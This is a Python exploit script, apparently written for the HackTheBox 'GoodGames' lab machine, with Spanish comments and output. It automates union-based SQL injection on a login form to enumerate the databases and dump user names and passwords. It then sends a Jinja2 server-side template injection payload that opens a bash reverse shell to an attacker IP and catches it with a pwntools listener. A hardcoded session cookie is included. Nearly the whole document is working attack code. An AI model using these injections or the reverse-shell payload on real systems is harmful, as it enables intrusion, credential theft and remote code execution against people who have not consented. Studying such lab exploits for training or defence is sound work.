#!/usr/bin/python3

from pwn import *
import signal, sys, requests, re, pdb, threading


# Colors
reset = "\033[0m"
black = "\033[30m"
red = "\033[31m"
green = "\033[32m"
yellow = "\033[33m"
blue = "\033[34m"
magenta = "\033[35m"
cyan = "\033[36m"
white = "\033[37m"
gray = "\033[90m"

def def_handler(sig, frame):
    print(red + "\n\n[!] Saliendo...\n\n" + reset)
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
main_url = "http://goodgames.htb/login"
ssti_url = "http://internal-administration.goodgames.htb/settings"

LHOST = "10.10.16.5"    # CHANGE ME
LPORT = "443"           # CHANGE ME


# SQLi -> Obtener nombres de bases de datos
def getDatabase():
    p1 = log.progress("SQL Injection")
    p1.status(yellow + "Enumerando las bases de datos existentes..." + reset)
    
    time.sleep(2)
    
    parsed = "x"
    databases = []
    i = 0

    while parsed != "":
        myQuery = "test@test.com' union select 1,2,3,schema_name from information_schema.schemata limit %d,1-- -" % i
    
        post_data = {
                'email': '%s' % myQuery,
                'password': 'test'
                }
    
        r = requests.post(main_url, data=post_data)

        filt = re.findall(r'<h2 class="h4">.*?</h2>', r.text)[0]
        
        if 'Internal server error!' in filt:
            print()
            break
        else:
            parsed = re.findall('Welcome \w+', filt)[0]
            parsed = parsed.replace("Welcome ", "")
            databases.append(parsed)
            p1.success(green + "Las bases de datos existentes son:\n" + reset)
            print("\t> %s" % parsed)
            i += 1


# SQLi -> Obtener nombres de tablas existentes en las bases de datos
def getTables():
    p2 = log.progress("SQL Injection")
    p2.status(yellow + "Enumerando las tablas existentes en la base de datos 'main'..." + reset)
    
    time.sleep(2)
    
    parsed = "x"
    tables = []
    i = 0
    
    while parsed != "":
        myQuery = """test@test.com' union select 1,2,3,table_name from information_schema.tables where table_schema="main" limit %d,1-- -""" % i

        post_data = {
            'email': '%s' % myQuery,
            'password': 'test'
            }
        
        r = requests.post(main_url, data=post_data)

        filt = re.findall(r'<h2 class="h4">.*?</h2>', r.text)[0]

        if 'Internal server error!' in filt:
            print()
            break
        else:
            parsed = re.findall('Welcome \w+', filt)[0]
            parsed = parsed.replace("Welcome ", "")
            tables.append(parsed)
            p2.success(green + "Las tablas existentes en la base de datos 'main' son:\n" + reset)
            print("\t> %s" % tables[i])
            i += 1

# SQLi -> Obtener nombre de columnas existentes en las tablas
def getColumns():
    p3 = log.progress("SQL Injection")
    p3.status(yellow + "Enumerando las columnas de la tabla 'user' de la base de datos 'main'..." + reset)
    
    time.sleep(2)
    
    parsed = "x"
    columns = []
    i = 0

    while parsed != "":
        myQuery = """' union select 1,2,3,column_name from information_schema.columns where table_schema="main" and table_name="user" limit %d,1-- -""" % i
        post_data = {
            'email': '%s' % myQuery,
            'password': 'test'
            }
        
        r = requests.post(main_url, data=post_data)

        filt = re.findall(r'<h2 class="h4">.*?</h2>', r.text)[0]

        if 'Internal server error!' in filt:
            print()
            break
        else:
            parsed = re.findall('Welcome \w+', filt)[0]
            parsed = parsed.replace("Welcome ", "")
            columns.append(parsed)
            p3.success(green + "Las columnas existentes en la tabla 'user' son:\n" + reset)
            print("\t> %s" % columns[i])
            i += 1

# SQLi -> Obtener las credenciales del usuario
def getCreds():
    p4 = log.progress("SQL Injection")
    p4.status(yellow + "Enumerando las columnas 'name' y 'password'..." + reset)
    
    time.sleep(2)
    
    myQuery = """' union select 1,2,3,group_concat(name,0x3a,password) from user-- -&password=test"""
    
    post_data = {
            'email': '%s' % myQuery,
            'password': 'test'
            }
    
    r = requests.post(main_url, data=post_data)

    filt = re.findall(r'<h2 class="h4">.*?</h2>', r.text)[0]
    parsed = re.findall('Welcome \w+:\w+', filt)[0]
    parsed = parsed.replace("Welcome ", "")
    p4.success(green + "Las credenciales son:" + reset + "\n\n> %s [superadministrator]\n\n" % parsed)

# Intrusión -> Ganar acceso a la máquina víctima
def gainAccess():
    p5 = log.progress("SSTI")
    p5.status(yellow + "Ganando acceso al sistema..." + reset)
    
    time.sleep(2)
    
    user = "admin"
    password = "superadministrator"
    

    myInjection = """{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'").read() }}""" % (LHOST, LPORT)
    

    post_data = {
            'name': '%s' %myInjection       
            }
    

    headers = {
            'Cookie': 'session=.eJwljk1qQzEMhO_idRbWj205l3lIlkRLoIX3klXI3WvoYhYzzAzfuxx5xvVV7s_zFbdyfHu5F-0yyNsclrXNCF6uoEJiUCmUdEsihTsHGiTODIckagSmbWpkoLsmGXWYo8kaVbBzZUXIbogTp7ugI2Ny00W5Ro6asW9b2SCvK85_Gth2XWcez99H_Oxgd9zNxuaCCWtlH0Jdhfd-0WC3_QcE5fMHlKJBAg.Ymn3Ug.YyH4wTiG9QxCPZjFBCJ7xd7ze5E'
            }

    p5.success(green + "Reverse shell enviada:\n\n" + reset)
    r = requests.post(ssti_url, data=post_data, headers=headers)


if __name__ == "__main__":
    
    getDatabase()
    time.sleep(1)
    
    getTables()
    time.sleep(1)
    
    getColumns()
    time.sleep(1)

    getCreds()
    time.sleep(1)

    try:
        threading.Thread(target=gainAccess, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(port=LPORT, timeout=20).wait_for_connection()

    shell.interactive()

